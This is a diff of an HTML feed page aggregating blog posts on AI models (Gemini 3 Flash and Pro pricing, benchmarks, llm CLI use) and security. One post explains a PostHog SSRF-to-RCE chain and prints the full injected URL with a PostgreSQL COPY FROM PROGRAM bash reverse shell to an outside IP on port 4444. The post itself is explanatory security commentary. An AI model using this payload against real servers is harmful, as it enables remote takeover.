@@ -25,9 +25,222 @@
 
   <ul>
     <li>
+      <time>2025-12-18</time>
+
+      <section>
+      <article>
+          <details>
+            <summary>
+              Inside PostHog: How SSRF, a ClickHouse SQL Escaping 0day, and Default PostgreSQL Credentials Formed an RCE Chain
+              <span class="post-metadata">(2 min | 698 words)</span> 
+            </summary>
+            <div class="post-content">
+              <a target="_blank" href=https://simonwillison.net/2025/Dec/18/ssrf-clickhouse-postgresql/#atom-everything>Inside PostHog: How SSRF, a ClickHouse SQL Escaping 0day, and Default PostgreSQL Credentials Formed an RCE Chain
+The way in abuses a webhooks system with non-robust URL validation, setting up a SSRF (Server-Side Request Forgery) attack where the server makes a request against an internal network resource.
+Here&#x27;s the URL that gets injected:
+http://clickhouse:8123/?query&#x3D;SELECT++FROM+postgresql(&#x27;db:5432&#x27;,&#x27;posthog&#x27;,\&quot;posthog_use&#x27;))+TO+STDOUT;END;DROP+TABLE+IF+EXISTS+cmd_exec;CREATE+TABLE+cmd_exec(cmd_output+text);COPY+cmd_exec+FROM+PROGRAM+$$bash+-c+\\&quot;bash+-i+&gt;%26+/dev/tcp/172.31.221.180/4444+0&gt;%261\\&quot;$$;SELECT++FROM+cmd_exec;+--\&quot;,&#x27;posthog&#x27;,&#x27;posthog&#x27;)#
+Reformatted a little for readability:
+http://clickhouse:8123/?query&#x3D;
+SELECT *
+FROM postgresql(
+    &#x27;db:5432&#x27;,
+    &#x27;posthog&#x27;,
+    &quot;posthog_use&#x27;)) TO STDOUT;
+    END;
+    DROP TABLE IF EXISTS cmd_exec;
+    CREATE TABLE cmd_exec (
+        cmd_output text
+    );
+    COPY cmd_exec
+    FROM PROGRAM $$
+        bash -c \&quot;bash -i &gt;&amp; /dev/tcp/172.31.221.180/4444 0&gt;&amp;1\&quot;
+    $$;
+    SELECT * FROM cmd_exec;
+    --&quot;,
+    &#x27;posthog&#x27;,
+    &#x27;posthog&#x27;
+)
+#
+
+This abuses ClickHouse&#x27;s ability to run its own queries against PostgreSQL using the postgresql() table function, combined with an escaping bug in ClickHouse PostgreSQL function (since fixed). Then that query abuses PostgreSQL&#x27;s ability to run shell commands via COPY ... FROM PROGRAM.
+The bash -c bit is particularly nasty - it opens a reverse shell such that an attacker with a machine at that IP address listening on port 4444 will receive a connection from the PostgreSQL server that can then be used to execute arbitrary commands.
+
+    
+Via Hacker News
+Tags: postgresql, security, webhooks, clickhouse</a>
+            </div>
+            <!-- <p class="post-source">Simon Willison&#x27;s Weblog</p> -->
+          </details>
+      </article>
+
+      </section>
+    </li>
+    <li>
       <time>2025-12-17</time>
 
       <section>
+      <article>
+          <details>
+            <summary>
+              AoAH Day 15: Porting a complete HTML5 parser and browser test suite
+              <span class="post-metadata">(2 min | 747 words)</span> 
+            </summary>
+            <div class="post-content">
+              <a target="_blank" href=https://simonwillison.net/2025/Dec/17/vibespiling/#atom-everything>AoAH Day 15: Porting a complete HTML5 parser and browser test suite
+Advent of Agentic Humps this year, building a new useful OCaml library every day for most of December.
+Inspired by Emil Stenström&#x27;s JustHTML and my own coding agent port of that to JavaScript he coined the term vibespiling for AI-powered porting and transpiling of code from one language to another and had a go at building an HTML5 parser in OCaml, resulting in html5rw which passes the same html5lib-tests suite that Emil and myself used for our projects.
+Anil&#x27;s thoughts on the copyright and ethical aspects of this are worth quoting in full:
+The question of copyright and licensing is difficult. I definitely did some editing by hand, and a fair bit of prompting that resulted in targeted code edits, but the vast amount of architectural logic came from JustHTML. So I opted to make the LICENSE a joint one with Emil Stenström. I did not follow the transitive dependency through to the Rust one, which I probably should.
+I&#x27;m also extremely uncertain about every releasing this library to the central opam repository, especially as there are excellent HTML5 parsers already available. I haven&#x27;t checked if those pass the HTML5 test suite, because this is wandering into the agents vs humans territory that I ruled out in my groundrules. Whether or not this agentic code is better or not is a moot point if releasing it drives away the human maintainers who are the source of creativity in the code!
+I decided to credit Emil in the same way for my own vibespiled project.
+
+    
+Via @avsm
+Tags: definitions, functional-programming, ai, generative-ai, llms, ai-assisted-programming, ai-ethics, vibe-coding, ocaml</a>
+            </div>
+            <!-- <p class="post-source">Simon Willison&#x27;s Weblog</p> -->
+          </details>
+      </article>
+      <article>
+          <details>
+            <summary>
+              Gemini 3 Flash
+              <span class="post-metadata">(5 min | 1470 words)</span> 
+            </summary>
+            <div class="post-content">
+              <a target="_blank" href=https://simonwillison.net/2025/Dec/17/gemini-3-flash/#atom-everything>It continues to be a busy December, if not quite as busy as last year. Today&#x27;s big news is Gemini 3 Flash, the latest in Google&#x27;s &quot;Flash&quot; line of faster and less expensive models.
+
+Google are emphasizing the comparison between the new Flash and their previous generation&#x27;s top model Gemini 2.5 Pro:
+
+
+Building on 3 Pro’s strong multimodal, coding and agentic features, 3 Flash offers powerful performance at less than a quarter the cost of 3 Pro, along with higher rate limits. The new 3 Flash model surpasses 2.5 Pro across many benchmarks while delivering faster speeds.
+
+
+Gemini 3 Flash&#x27;s characteristics are almost identical to Gemini 3 Pro: it accepts text, image, video, audio, and PDF, outputs only text, handles 1,048,576 maximum input tokens and up to 65,536 output tokens, and has the same knowledge cut-off date of January 2025 (also shared with the Gemini 2.5 series).
+
+The benchmarks look good. The cost is appealing: 1/4 the price of Gemini 3 Pro ≤200k and 1/8 the price of Gemini 3 Pro &gt;200k, and it&#x27;s nice not to have a price increase for the new Flash at larger token lengths.
+
+It&#x27;s a little more expensive than previous Flash models - Gemini 2.5 Flash was $0.30/million input tokens and $2.50/million on output, Gemini 3 Flash is $0.50/million and $3/million respectively.
+
+Here&#x27;s a more extensive price comparison on my llm-prices.com site.
+
+Generating some SVGs of pelicans
+
+I released llm-gemini 0.28 this morning with support for the new model. You can try it out like this:
+
+llm install -U llm-gemini
+llm keys set gemini # paste in key
+llm -m gemini-3-flash-preview &quot;Generate an SVG of a pelican riding a bicycle&quot;
+
+
+According to the developer docs the new model supports four different thinking level options: minimal, low, medium, and high. This is different from Gemini 3 Pro, which only supported low and high.
+
+You can run those like this:
+
+llm -m gemini-3-flash-preview --thinking-level minimal &quot;Generate an SVG of a pelican riding a bicycle&quot;
+
+
+Here are four pelicans, for thinking levels minimal, low, medium, and high:
+
+
+    
+    
+    
+    
+
+I built the gallery component with Gemini 3 Flash
+
+The gallery above uses a new Web Component which I built using Gemini 3 Flash to try out its coding abilities. The code on the page looks like this:
+
+
+&lt;image-gallery width&#x3D;&quot;4&quot;&gt;
+    &lt;img src&#x3D;&quot;https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-minimal-pelican-svg.jpg&quot; alt&#x3D;&quot;A minimalist vector illustration of a stylized white bird with a long orange beak and a red cap riding a dark blue bicycle on a single grey ground line against a plain white background.&quot; /&gt;
+    &lt;img src&#x3D;&quot;https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-low-pelican-svg.jpg&quot; alt&#x3D;&quot;Minimalist illustration: A stylized white bird with a large, wedge-shaped orange beak and a single black dot for an eye rides a red bicycle with black wheels and a yellow pedal against a solid light blue background.&quot; /&gt;
+    &lt;img src&#x3D;&quot;https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-medium-pelican-svg.jpg&quot; alt&#x3D;&quot;A minimalist illustration of a stylized white bird with a large yellow beak riding a red road bicycle in a racing position on a light blue background.&quot; /&gt;
+    &lt;img src&#x3D;&quot;https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-high-pelican-svg.jpg&quot; alt&#x3D;&quot;Minimalist line-art illustration of a stylized white bird with a large orange beak riding a simple black bicycle with one orange pedal, centered against a light blue circular background.&quot; /&gt;
+&lt;/image-gallery&gt;
+
+Those alt attributes are all generated by Gemini 3 Flash as well, using this recipe:
+
+
+llm -m gemini-3-flash-preview --system &#x27;
+You write alt text for any image pasted in by the user. Alt text is always presented in a
+fenced code block to make it easy to copy and paste out. It is always presented on a single
+line so it can be used easily in Markdown images. All text on the image (for screenshots etc)
+must be exactly included. A short note describing the nature of the image itself should go first.&#x27; \
+-a https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-high-pelican-svg.jpg
+
+You can see the code that powers the image gallery Web Component here on GitHub. I built it by prompting Gemini 3 Flash via LLM like this:
+
+
+llm -m gemini-3-flash-preview &#x27;
+Build a Web Component that implements a simple image gallery. Usage is like this:
+
+&lt;image-gallery width&#x3D;&quot;5&quot;&gt;
+  &lt;img src&#x3D;&quot;image1.jpg&quot; alt&#x3D;&quot;Image 1&quot;&gt;
+  &lt;img src&#x3D;&quot;image2.jpg&quot; alt&#x3D;&quot;Image 2&quot; data-thumb&#x3D;&quot;image2-thumb.jpg&quot;&gt;
+  &lt;img src&#x3D;&quot;image3.jpg&quot; alt&#x3D;&quot;Image 3&quot;&gt;
+&lt;/image-gallery&gt;
+
+If an image has a data-thumb&#x3D; attribute that one is used instead, other images are scaled down. 
+
+The image gallery always takes up 100% of available width. The width&#x3D;&quot;5&quot; attribute means that five images will be shown next to each other in each row. The default is 3. There are gaps between the images. When an image is clicked it opens a modal dialog with the full size image.
+
+Return a complete HTML file with both the implementation of the Web Component several example uses of it. Use https://picsum.photos/300/200 URLs for those example images.&#x27;
+
+It took a few follow-up prompts using llm -c:
+
+
+llm -c &#x27;Use a real modal such that keyboard shortcuts and accessibility features work without extra JS&#x27;
+
+llm -c &#x27;Use X for the close icon and make it a bit more subtle&#x27;
+
+llm -c &#x27;remove the hover effect entirely&#x27;
+
+llm -c &#x27;I want no border on the close icon even when it is focused&#x27;
+
+Here&#x27;s the full transcript, exported using llm logs -cue.
+
+Those five prompts took:
+
+
+225 input, 3,269 output
+
+2,243 input, 2,908 output
+
+4,319 input, 2,516 output
+
+6,376 input, 2,094 output
+
+8,151 input, 1,806 output
+
+
+Added together that&#x27;s 21,314 input and 12,593 output for a grand total of 4.8436 cents.
+
+The guide to migrating from Gemini 2.5 reveals one disappointment:
+
+
+Image segmentation: Image segmentation capabilities (returning pixel-level masks for objects) are not supported in Gemini 3 Pro or Gemini 3 Flash. For workloads requiring native image segmentation, we recommend continuing to utilize Gemini 2.5 Flash with thinking turned off or Gemini Robotics-ER 1.5.
+
+
+I wrote about this capability in Gemini 2.5 back in April. I hope they come back in future models - they&#x27;re a really neat capability that is unique to Gemini.
+Tags: google, ai, web-components, generative-ai, llms, llm, gemini, llm-pricing, pelican-riding-a-bicycle, llm-release</a>
+            </div>
+            <!-- <p class="post-source">Simon Willison&#x27;s Weblog</p> -->
+          </details>
+      </article>
+      <article>
+          <details>
+            <summary>
+              gemini-3-flash-preview
+              <span class="post-metadata">(7 min | 2244 words)</span> 
+            </summary>
+            <div class="post-content">
+              <a target="_blank" href=https://ollama.com/library/gemini-3-flash-preview>Gemini 3 Flash offers frontier intelligence built for speed at a fraction of the cost.</a>
+            </div>
+            <!-- <p class="post-source">Ollama models</p> -->
+          </details>
+      </article>
       <article>
           <details>
             <summary>
@@ -4700,697 +4913,6 @@ thread fl2_worker_thread panicked: called Result::unwrap() on an Err value
 Tags: scaling, postmortem, cloudflare, rust</a>
             </div>
             <!-- <p class="post-source">Simon Willison&#x27;s Weblog</p> -->
-          </details>
-      </article>
-
-      </section>
-    </li>
-    <li>
-      <time>2025-11-18</time>
-
-      <section>
-      <article>
-          <details>
-            <summary>
-              llm-gemini 0.27
-              <span class="post-metadata">(1 min | 381 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://simonwillison.net/2025/Nov/18/llm-gemini/#atom-everything>llm-gemini 0.27
-Support for nested schemas in Pydantic, thanks Bill Pugh. #107
-Now tests against Python 3.14.
-Support for YouTube URLs as attachments and the media_resolution option. Thanks, Duane Milne. #112
-New model: gemini-3-pro-preview. #113
-The YouTube URL feature is particularly neat, taking advantage of this API feature. I used it against the Google Antigravity launch video:
-llm -m gemini-3-pro-preview \
- -a &#x27;https://www.youtube.com/watch?v&#x3D;nTOVIGsqCuY&#x27; \
- &#x27;Summary, with detailed notes about what this thing is and how it differs from regular VS Code, then a complete detailed transcript with timestamps&#x27;
-
-Here&#x27;s the result. A spot-check of the timestamps against points in the video shows them to be exactly right.
-
-
-    
-Tags: projects, youtube, ai, generative-ai, llms, llm, gemini</a>
-            </div>
-            <!-- <p class="post-source">Simon Willison&#x27;s Weblog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              MacWhisper has Automatic Speaker Recognition now
-              <span class="post-metadata">(1 min | 334 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://simonwillison.net/2025/Nov/18/macwhisper-speaker-recognition/#atom-everything>Inspired by this conversation on Hacker News I decided to upgrade MacWhisper to try out NVIDIA Parakeet and the new Automatic Speaker Recognition feature.
-It appears to work really well! Here&#x27;s the result against this 39.7MB m4a file from my Gemini 3 Pro write-up this morning:
-
-You can export the transcript with both timestamps and speaker names using the Share -&gt; Segments &gt; .json menu item:
-
-Here&#x27;s the resulting JSON.
-Tags: whisper, nvidia, ai, speech-to-text, macwhisper</a>
-            </div>
-            <!-- <p class="post-source">Simon Willison&#x27;s Weblog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              GitHub Copilot CLI: New models, enhanced code search, and better image support
-              <span class="post-metadata">(6 min | 1715 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://github.blog/changelog/2025-11-18-github-copilot-cli-new-models-enhanced-code-search-and-better-image-support>GitHub Copilot CLI continues to evolve with significant improvements to search capabilities, better image support, access to and support for the latest AI models, and reliability enhancements. Here’s what we’ve…
-The post GitHub Copilot CLI: New models, enhanced code search, and better image support appeared first on The GitHub Blog.</a>
-            </div>
-            <!-- <p class="post-source">Archive: 2025 - GitHub Changelog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              Google Antigravity
-              <span class="post-metadata">(2 min | 525 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://simonwillison.net/2025/Nov/18/google-antigravity/#atom-everything>Google Antigravity
-Gemini 3 Pro. At first glance Antigravity is yet another VS Code fork Cursor clone - it&#x27;s a desktop application you install that then signs in to your Google account and provides an IDE for agentic coding against their Gemini models.
-When you look closer it&#x27;s actually a fair bit more interesting than that.
-The best introduction right now is the official 14 minute Learn the basics of Google Antigravity video on YouTube, where product engineer Kevin Hou (who previously worked at Windsurf) walks through the process of building an app.
-There are some interesting new ideas in Antigravity. The application itself has three &quot;surfaces&quot; - an agent manager dashboard, a traditional VS Code style editor and deep integration with a browser via a new Chrome extension. This plays a similar role to Playwright MCP, allowing the agent to directly test the web applications it is building.
-Antigravity also introduces the concept of &quot;artifacts&quot; (confusingly not at all similar to Claude Artifacts). These are Markdown documents that are automatically created as the agent works, for things like task lists, implementation plans and a &quot;walkthrough&quot; report showing what the agent has done once it finishes.
-I tried using Antigravity to help add support for Gemini 3 to by llm-gemini plugin. 
-
-It worked OK at first then gave me an &quot;Agent execution terminated due to model provider overload. Please try again later&quot; error. I&#x27;m going to give it another go after they&#x27;ve had a chance to work through those initial launch jitters.
-
-
-    
-Tags: google, ai, generative-ai, llms, ai-assisted-programming, gemini, vs-code, coding-agents</a>
-            </div>
-            <!-- <p class="post-source">Simon Willison&#x27;s Weblog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              Quoting Ethan Mollick
-              <span class="post-metadata">(1 min | 351 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://simonwillison.net/2025/Nov/18/ethan-mollick/#atom-everything>Three years ago, we were impressed that a machine could write a poem about otters. Less than 1,000 days later, I am debating statistical methodology with an agent that built its own research environment. The era of the chatbot is turning into the era of the digital coworker. To be very clear, Gemini 3 isn’t perfect, and it still needs a manager who can guide and check it. But it suggests that “human in the loop” is evolving from “human who fixes AI mistakes” to “human who directs AI work.” And that may be the biggest change since the release of ChatGPT.
-
-— Ethan Mollick, Three Years from GPT-3 to Gemini 3
-Tags: gemini, ethan-mollick, generative-ai, chatgpt, ai, llms, ai-agents</a>
-            </div>
-            <!-- <p class="post-source">Simon Willison&#x27;s Weblog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              Trying out Gemini 3 Pro with audio transcription and a new pelican benchmark
-              <span class="post-metadata">(8 min | 2389 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://simonwillison.net/2025/Nov/18/gemini-3/#atom-everything>Google released Gemini 3 Pro today. Here&#x27;s the announcement from Sundar Pichai, Demis Hassabis, and Koray Kavukcuoglu, their developer blog announcement from Logan Kilpatrick, the Gemini 3 Pro Model Card, and their collection of 11 more articles. It&#x27;s a big release!
-
-I had a few days of preview access to this model via AI Studio. The best way to describe it is that it&#x27;s Gemini 2.5 upgraded to match the leading rival models.
-
-Gemini 3 has the same underlying characteristics as Gemini 2.5. The knowledge cutoff is the same (January 2025). It accepts 1 million input tokens, can output up to 64,000 tokens, and has multimodal inputs across text, images, audio, and video.
-
-Benchmarks
-
-Google&#x27;s own reported numbers (in the model card) show it scoring slightly higher against Claude 4.5 Sonnet and GPT-5.1 against most of the standard benchmarks. As always I&#x27;m waiting for independent confirmation, but I have no reason to believe those numbers are inaccurate.
-
-
-
-Pricing
-
-It terms of pricing it&#x27;s a little more expensive than Gemini 2.5 but still cheaper than Claude Sonnet 4.5. Here&#x27;s how it fits in with those other leading models:
-
-
-
-  
-    
-
-      Model
-      Input (per 1M tokens)
-      Output (per 1M tokens)
-    
-
-  
-  
-    
-
-      GPT-5.1
-      $1.25
-      $10.00
-    
-
-    
-
-      Gemini 2.5 Pro
-      
-        ≤ 200k tokens: $1.25
-
-        &gt; 200k tokens: $2.50
-      
-      
-        ≤ 200k tokens: $10.00
-
-        &gt; 200k tokens: $15.00
-      
-    
-
-    
-
-      Gemini 3 Pro
-      
-        ≤ 200k tokens: $2.00
-
-        &gt; 200k tokens: $4.00
-      
-      
-        ≤ 200k tokens: $12.00
-
-        &gt; 200k tokens: $18.00
-      
-    
-
-    
-
-      Claude Sonnet 4.5
-      
-        ≤ 200k tokens: $3.00
-
-        &gt; 200k tokens: $6.00
-      
-      
-        ≤ 200k tokens: $15.00
-
-        &gt; 200k tokens: $22.50
-      
-    
-
-    
-
-      Claude Opus 4.1
-      $15.00
-      $75.00
-    
-
-  
-
-Trying it out against a complex image
-
-That screenshot of the benchmarks from above looked like a good test for Gemini 3&#x27;s multimodal support. I fed it that image URL and asked it to generate alt text for the image:
-
-
-llm -m gemini-3-pro-preview -a https://static.simonwillison.net/static/2025/gemini-3-benchmarks.jpg &#x27;Alt text for this image, include all figures and make them comprehensible to a screen reader user&#x27;
-
-
-Here&#x27;s what I got back:
-
-
-A comprehensive table comparing four AI models across various performance benchmarks. The columns listed are: Benchmark Name, Description, Gemini 3 Pro (highlighted in blue), Gemini 2.5 Pro, Claude Sonnet 4.5, and GPT-5.1.
-
-Humanity&#x27;s Last Exam (Academic reasoning)
-
-
-No tools: Gemini 3 Pro 37.5%, Gemini 2.5 Pro 21.6%, Claude Sonnet 4.5 13.7%, GPT-5.1 26.5%.
-
-With search and code execution: Gemini 3 Pro 45.8% (others have no data).
-
-
-ARC-AGI-2 (Visual reasoning puzzles; ARC Prize Verified)
-
-
-Gemini 3 Pro 31.1%, Gemini 2.5 Pro 4.9%, Claude Sonnet 4.5 13.6%, GPT-5.1 17.6%.
-
-
-GPQA Diamond (Scientific knowledge; No tools)
-
-
-Gemini 3 Pro 91.9%, Gemini 2.5 Pro 86.4%, Claude Sonnet 4.5 83.4%, GPT-5.1 88.1%.
-
-
-AIME 2025 (Mathematics)
-
-
-No tools: Gemini 3 Pro 95.0%, Gemini 2.5 Pro 88.0%, Claude Sonnet 4.5 87.0%, GPT-5.1 94.0%.
-
-With code execution: Gemini 3 Pro 100%, Claude Sonnet 4.5 100%.
-
-
-MathArena Apex (Challenging Math Contest problems)
-
-
-Gemini 3 Pro 23.4%, Gemini 2.5 Pro 0.5%, Claude Sonnet 4.5 1.6%, GPT-5.1 1.0%.
-
-
-MMMU-Pro (Multimodal understanding and reasoning)
-
-
-Gemini 3 Pro 81.0%, Gemini 2.5 Pro 68.0%, Claude Sonnet 4.5 68.0%, GPT-5.1 76.0%.
-
-
-ScreenSpot-Pro (Screen understanding)
-
-
-Gemini 3 Pro 72.7%, Gemini 2.5 Pro 11.4%, Claude Sonnet 4.5 36.2%, GPT-5.1 3.5%.
-
-
-CharXiv Reasoning (Information synthesis from complex charts)
-
-
-Gemini 3 Pro 81.4%, Gemini 2.5 Pro 69.6%, Claude Sonnet 4.5 68.5%, GPT-5.1 69.5%.
-
-
-OmniDocBench 1.5 (OCR; Overall Edit Distance, lower is better)
-
-
-Gemini 3 Pro 0.115, Gemini 2.5 Pro 0.145, Claude Sonnet 4.5 0.145, GPT-5.1 0.147.
-
-
-Video-MMMU (Knowledge acquisition from videos)
-
-
-Gemini 3 Pro 87.6%, Gemini 2.5 Pro 83.6%, Claude Sonnet 4.5 77.8%, GPT-5.1 80.4%.
-
-
-LiveCodeBench Pro (Competitive coding problems; Elo Rating, higher is better)
-
-
-Gemini 3 Pro 2,439; Gemini 2.5 Pro 1,775; Claude Sonnet 4.5 1,418; GPT-5.1 2,243.
-
-
-Terminal-Bench 2.0 (Agentic terminal coding; Terminus-2 agent)
-
-
-Gemini 3 Pro 54.2%, Gemini 2.5 Pro 32.6%, Claude Sonnet 4.5 42.8%, GPT-5.1 47.6%.
-
-
-SWE-Bench Verified (Agentic coding; Single attempt)
-
-
-Gemini 3 Pro 76.2%, Gemini 2.5 Pro 59.6%, Claude Sonnet 4.5 77.2%, GPT-5.1 76.3%.
-
-
-t2-bench (Agentic tool use)
-
-
-Gemini 3 Pro 85.4%, Gemini 2.5 Pro 54.9%, Claude Sonnet 4.5 84.7%, GPT-5.1 80.2%.
-
-
-Vending-Bench 2 (Long-horizon agentic tasks; Net worth (mean), higher is better)
-
-
-Gemini 3 Pro $5,478.16; Gemini 2.5 Pro $573.64; Claude Sonnet 4.5 $3,838.74; GPT-5.1 $1,473.43.
-
-
-FACTS Benchmark Suite (Held out internal grounding, parametric, MM, and search retrieval benchmarks)
-
-
-Gemini 3 Pro 70.5%, Gemini 2.5 Pro 63.4%, Claude Sonnet 4.5 50.4%, GPT-5.1 50.8%.
-
-
-SimpleQA Verified (Parametric knowledge)
-
-
-Gemini 3 Pro 72.1%, Gemini 2.5 Pro 54.5%, Claude Sonnet 4.5 29.3%, GPT-5.1 34.9%.
-
-
-MMMLU (Multilingual Q&amp;A)
-
-
-Gemini 3 Pro 91.8%, Gemini 2.5 Pro 89.5%, Claude Sonnet 4.5 89.1%, GPT-5.1 91.0%.
-
-
-Global PIQA (Commonsense reasoning across 100 Languages and Cultures)
-
-
-Gemini 3 Pro 93.4%, Gemini 2.5 Pro 91.5%, Claude Sonnet 4.5 90.1%, GPT-5.1 90.9%.
-
-
-MRCR v2 (8-needle) (Long context performance)
-
-
-128k (average): Gemini 3 Pro 77.0%, Gemini 2.5 Pro 58.0%, Claude Sonnet 4.5 47.1%, GPT-5.1 61.6%.
-
-1M (pointwise): Gemini 3 Pro 26.3%, Gemini 2.5 Pro 16.4%, Claude Sonnet 4.5 (not supported), GPT-5.1 (not supported).
-
-
-
-I have not checked every line of this but a loose spot-check looks accurate to me.
-
-That prompt took 1,105 input and 3,901 output tokens, at a cost of 5.6824 cents.
-
-I ran this follow-up prompt:
-
-
-llm -c &#x27;Convert to JSON&#x27;
-
-
-You can see the full output here, which starts like this:
-
-
-{
-  &quot;metadata&quot;: {
-    &quot;columns&quot;: [
-      &quot;Benchmark&quot;,
-      &quot;Description&quot;,
-      &quot;Gemini 3 Pro&quot;,
-      &quot;Gemini 2.5 Pro&quot;,
-      &quot;Claude Sonnet 4.5&quot;,
-      &quot;GPT-5.1&quot;
-    ]
-  },
-  &quot;benchmarks&quot;: [
-    {
-      &quot;name&quot;: &quot;Humanity&#x27;s Last Exam&quot;,
-      &quot;description&quot;: &quot;Academic reasoning&quot;,
-      &quot;sub_results&quot;: [
-        {
-          &quot;condition&quot;: &quot;No tools&quot;,
-          &quot;gemini_3_pro&quot;: &quot;37.5%&quot;,
-          &quot;gemini_2_5_pro&quot;: &quot;21.6%&quot;,
-          &quot;claude_sonnet_4_5&quot;: &quot;13.7%&quot;,
-          &quot;gpt_5_1&quot;: &quot;26.5%&quot;
-        },
-        {
-          &quot;condition&quot;: &quot;With search and code execution&quot;,
-          &quot;gemini_3_pro&quot;: &quot;45.8%&quot;,
-          &quot;gemini_2_5_pro&quot;: null,
-          &quot;claude_sonnet_4_5&quot;: null,
-          &quot;gpt_5_1&quot;: null
-        }
-      ]
-    },
-
-Analyzing a city council meeting
-
-To try it out against an audio file I extracted the 3h33m of audio from the video Half Moon Bay City Council Meeting - November 4, 2025. I used yt-dlp to get that audio:
-
-
-yt-dlp -x --audio-format m4a &#x27;https://www.youtube.com/watch?v&#x3D;qgJ7x7R6gy0&#x27;
-
-That gave me a 74M m4a file, which I ran through Gemini 3 Pro like this:
-
-
-llm -m gemini-3-pro-preview -a /tmp/HMBCC\ 11⧸4⧸25\ -\ Half\ Moon\ Bay\ City\ Council\ Meeting\ -\ November\ 4,\ 2025\ \[qgJ7x7R6gy0\].m4a &#x27;Output a Markdown transcript of this meeting. Include speaker names and timestamps. Start with an outline of the key meeting sections, each with a title and summary and timestamp and list of participating names. Note in bold if anyone raised their voices, interrupted each other or had disagreements. Then follow with the full transcript.&#x27;
-
-
-That failed with an &quot;Internal error encountered&quot; message, so I shrunk the file down to a more manageable 38MB using ffmpeg:
-
-
-ffmpeg -i &quot;/private/tmp/HMB.m4a&quot; -ac 1 -ar 22050 -c:a aac -b:a 24k &quot;/private/tmp/HMB_compressed.m4a&quot;
-
-Then ran it again like this (for some reason I had to use --attachment-type this time):
-
-
-llm -m gemini-3-pro-preview --attachment-type /tmp/HMB_compressed.m4a &#x27;audio/aac&#x27; &#x27;Output a Markdown transcript of this meeting. Include speaker names and timestamps. Start with an outline of the key meeting sections, each with a title and summary and timestamp and list of participating names. Note in bold if anyone raised their voices, interrupted each other or had disagreements. Then follow with the full transcript.&#x27;
-
-
-This time it worked! The full output is here, but it starts like this:
-
-
-Here is the transcript of the Half Moon Bay City Council meeting.
-
-Meeting Outline
-
-1. Call to Order, Updates, and Public Forum
-
-
-
-Summary: Mayor Brownstone calls the meeting to order. City Manager Chidester reports no reportable actions from the closed session. Announcements are made regarding food insecurity volunteers and the Diwali celebration. During the public forum, Councilmember Penrose (speaking as a citizen) warns against autocracy. Citizens speak regarding lease agreements, downtown maintenance, local music events, and homelessness outreach statistics.
-
-
-Timestamp: 00:00:00 - 00:13:25
-
-
-Participants: Mayor Brownstone, Matthew Chidester, Irma Acosta, Deborah Penrose, Jennifer Moore, Sandy Vella, Joaquin Jimenez, Anita Rees.
-
-
-2. Consent Calendar
-
-
-
-Summary: The Council approves minutes from previous meetings and a resolution authorizing a licensing agreement for Seahorse Ranch. Councilmember Johnson corrects a pull request regarding abstentions on minutes.
-
-
-Timestamp: 00:13:25 - 00:15:15
-
-
-Participants: Mayor Brownstone, Councilmember Johnson, Councilmember Penrose, Vice Mayor Ruddick, Councilmember Nagengast.
-
-
-3. Ordinance Introduction: Commercial Vitality (Item 9A)
-
-
-
-Summary: Staff presents a new ordinance to address neglected and empty commercial storefronts, establishing maintenance and display standards. Councilmembers discuss enforcement mechanisms, window cleanliness standards, and the need for objective guidance documents to avoid subjective enforcement.
-
-
-Timestamp: 00:15:15 - 00:30:45
-
-
-Participants: Karen Decker, Councilmember Johnson, Councilmember Nagengast, Vice Mayor Ruddick, Councilmember Penrose.
-
-
-4. Ordinance Introduction: Building Standards &amp; Electrification (Item 9B)
-
-
-
-Summary: Staff introduces updates to the 2025 Building Code. A major change involves repealing the city&#x27;s all-electric building requirement due to the 9th Circuit Court ruling (California Restaurant Association v. City of Berkeley). Public speaker Mike Ferreira expresses strong frustration and disagreement with &quot;unelected state agencies&quot; forcing the City to change its ordinances.
-
-
-Timestamp: 00:30:45 - 00:45:00
-
-
-Participants: Ben Corrales, Keith Weiner, Joaquin Jimenez, Jeremy Levine, Mike Ferreira, Councilmember Penrose, Vice Mayor Ruddick.
-
-
-5. Housing Element Update &amp; Adoption (Item 9C)
-
-
-
-Summary: Staff presents the 5th draft of the Housing Element, noting State HCD requirements to modify ADU allocations and place a measure on the ballot regarding the &quot;Measure D&quot; growth cap. There is significant disagreement from Councilmembers Ruddick and Penrose regarding the State&#x27;s requirement to hold a ballot measure. Public speakers debate the enforceability of Measure D. Mike Ferreira interrupts the vibe to voice strong distaste for HCD&#x27;s interference in local law. The Council votes to adopt the element but strikes the language committing to a ballot measure.
-
-
-Timestamp: 00:45:00 - 01:05:00
-
-
-Participants: Leslie (Staff), Joaquin Jimenez, Jeremy Levine, Mike Ferreira, Councilmember Penrose, Vice Mayor Ruddick, Councilmember Johnson.
-
-
-
-Transcript
-
-Mayor Brownstone [00:00:00]
-Good evening everybody and welcome to the November 4th Half Moon Bay City Council meeting. As a reminder, we have Spanish interpretation services available in person and on Zoom.
-
-Victor Hernandez (Interpreter) [00:00:35]
-Thank you, Mr. Mayor, City Council, all city staff, members of the public. [Spanish instructions provided regarding accessing the interpretation channel on Zoom and in the room.] Thank you very much.
-
-
-Those first two lines of the transcript already illustrate something interesting here: Gemini 3 Pro chose NOT to include the exact text of the Spanish instructions, instead summarizing them as &quot;[Spanish instructions provided regarding accessing the interpretation channel on Zoom and in the room.]&quot;.
-
-I haven&#x27;t spot-checked the entire 3hr33m meeting, but I&#x27;ve confirmed that the timestamps do not line up. The transcript closes like this:
-
-
-Mayor Brownstone [01:04:00]
-Meeting adjourned. Have a good evening.
-
-
-That actually happens at 3h31m5s and the mayor says:
-
-
